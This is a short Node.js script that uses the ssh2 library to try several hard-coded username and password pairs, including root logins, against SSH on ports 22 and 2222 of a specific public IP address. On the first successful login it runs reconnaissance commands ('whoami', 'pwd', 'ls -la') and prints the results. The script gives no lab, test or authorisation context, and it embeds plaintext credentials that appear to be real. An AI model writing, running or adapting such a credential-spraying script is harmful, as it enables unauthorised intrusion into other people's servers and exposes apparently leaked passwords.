const { Client } = require('ssh2');

const targets = [
    { username: 'selectt-api', password: 'qdBG7QXFQayXUuwvHPzo', port: 22 },
    { username: 'selectt-api', password: 'qdBG7QXFQayXUuwvHPzo', port: 2222 },
    { username: 'root', password: 'qdBG7QXFQayXUuwvHPzo', port: 22 },
    { username: 'root', password: '#ADPJc0UoNJxo7Ll', port: 22 },
    { username: 'root', password: 'ADPJc0UoNJxo7Ll', port: 22 }
];

async function tryTarget(t) {
    return new Promise((resolve) => {
        const conn = new Client();
        conn.on('ready', () => {
            console.log(`\n>>> SUCCESS with user: ${t.username}, port: ${t.port}`);
            conn.exec('whoami && pwd && ls -la', (err, stream) => {
                if (err) throw err;
                stream.on('data', (d) => process.stdout.write(d));
                stream.on('close', () => {
                    conn.end();
                    resolve(true);
                });
            });
        }).on('error', (err) => {
            console.log(`Failed with user ${t.username} on port ${t.port}: ${err.message}`);
            resolve(false);
        }).connect({
            host: '200.97.166.12',
            port: t.port,
            username: t.username,
            password: t.password,
            readyTimeout: 8000
        });
    });
}

async function main() {
    for (const t of targets) {
        const ok = await tryTarget(t);
        if (ok) return;
    }
}

main();
